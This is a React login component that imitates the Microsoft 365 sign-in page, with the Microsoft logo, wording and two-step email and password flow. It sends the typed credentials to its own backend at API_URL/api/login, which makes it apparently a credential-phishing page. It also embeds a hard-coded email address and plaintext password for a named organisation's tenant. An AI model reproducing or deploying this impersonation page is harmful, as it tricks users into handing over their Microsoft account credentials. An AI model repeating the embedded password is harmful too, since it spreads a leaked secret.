import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import API_URL from '../config';
import './Login.css';

export default function Login() {
  const [step, setStep] = useState('email'); // 'email' | 'password'
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPw, setShowPw] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const VALID_EMAIL = 'lekan@halalfood2021.onmicrosoft.com';
  const VALID_PASSWORD = 'Muhayad2008';

  const handleEmailNext = (e) => {
    e.preventDefault();
    setError('');
    if (!email.trim()) { setError('Enter an email address.'); return; }
    if (!email.includes('@')) { setError('Enter a valid email address.'); return; }
    setStep('password');
  };

  const handleSignIn = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const response = await fetch(`${API_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await response.json();

      if (response.ok) {
        localStorage.setItem('ms_admin_auth', JSON.stringify({
          token: data.token,
          email: data.user.email,
          displayName: data.user.name,
          initials: 'AD',
          tenant: 'Halal Food Foundation',
          tenantId: 'halalfood2021.onmicrosoft.com',
        }));
        navigate('/dashboard');
      } else {
        setError(data.message || 'Your account or password is incorrect.');
      }
    } catch (err) {
      console.error('Login error:', err);
      setError('An error occurred. Please check your connection and try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-page">
      <div className="login-container">
        <div className="login-card">
          {/* Microsoft logo */}
          <div className="ms-logo-wrap">
            <svg width="108" height="24" viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
              <rect x="12" y="0" width="11" height="11" fill="#7fba00"/>
              <rect x="0" y="12" width="11" height="11" fill="#00a4ef"/>
              <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
              <text x="28" y="17" fontFamily="Segoe UI, Arial, sans-serif" fontSize="15" fontWeight="600" fill="#1b1a19">Microsoft</text>
            </svg>
          </div>

          {step === 'email' ? (
            <form onSubmit={handleEmailNext} className="login-form">
              <h1 className="login-title">Sign in</h1>
              <p className="login-subtitle">to continue to Microsoft 365</p>

              {error && <div className="login-error">{error}</div>}

              <div className="login-field">
                <input
                  type="email"
                  className={`login-input ${error ? 'has-error' : ''}`}
                  placeholder="Email, phone, or Skype"
                  value={email}
                  onChange={e => { setEmail(e.target.value); setError(''); }}
                  autoFocus
                  autoComplete="username"
                />
              </div>

              <div className="login-links">
                <a href="#" className="login-link">No account? Create one!</a>
              </div>
              <div className="login-links">
                <a href="#" className="login-link">Can't access your account?</a>
              </div>

              <div className="login-actions">
                <div></div>
                <button type="submit" className="login-btn-next">Next</button>
              </div>

              <div className="login-options-row">
                <a href="#" className="login-link small">Sign-in options</a>
              </div>
            </form>
          ) : (
            <form onSubmit={handleSignIn} className="login-form">
              <div className="login-user-row">
                <div className="login-user-avatar">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                    <circle cx="12" cy="7" r="4"/>
                  </svg>
                </div>
                <button
                  type="button"
                  className="login-user-email-btn"
                  onClick={() => { setStep('email'); setPassword(''); setError(''); }}
                >
                  {email}
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <polyline points="6 9 12 15 18 9"/>
                  </svg>
                </button>
              </div>

              <h1 className="login-title">Enter password</h1>

              {error && <div className="login-error">{error}</div>}

              <div className="login-field password-field">
                <input
                  type={showPw ? 'text' : 'password'}
                  className={`login-input ${error ? 'has-error' : ''}`}
                  placeholder="Password"
                  value={password}
                  onChange={e => { setPassword(e.target.value); setError(''); }}
                  autoFocus
                  autoComplete="current-password"
                />
                <button
                  type="button"
                  className="pw-toggle"
                  onClick={() => setShowPw(!showPw)}
                  tabIndex={-1}
                >
                  {showPw ? (
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                      <line x1="1" y1="1" x2="23" y2="23"/>
                    </svg>
                  ) : (
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                  )}
                </button>
              </div>

              <div className="login-links">
                <a href="#" className="login-link">Forgot my password</a>
              </div>

              <div className="login-actions">
                <div></div>
                <button type="submit" className="login-btn-next" disabled={loading}>
                  {loading ? (
                    <span className="btn-spinner"></span>
                  ) : 'Sign in'}
                </button>
              </div>

              <div className="login-stay-signed">
                <label className="stay-label">
                  <input type="checkbox" defaultChecked />
                  <span>Stay signed in</span>
                </label>
                <a href="#" className="login-link small">Don't show this again</a>
              </div>
            </form>
          )}
        </div>

        <div className="login-footer">
          <a href="#">Terms of use</a>
          <a href="#">Privacy & cookies</a>
          <button type="button">···</button>
        </div>
      </div>

      <div className="login-bg">
        <div className="login-bg-pattern"></div>
      </div>
    </div>
  );
}
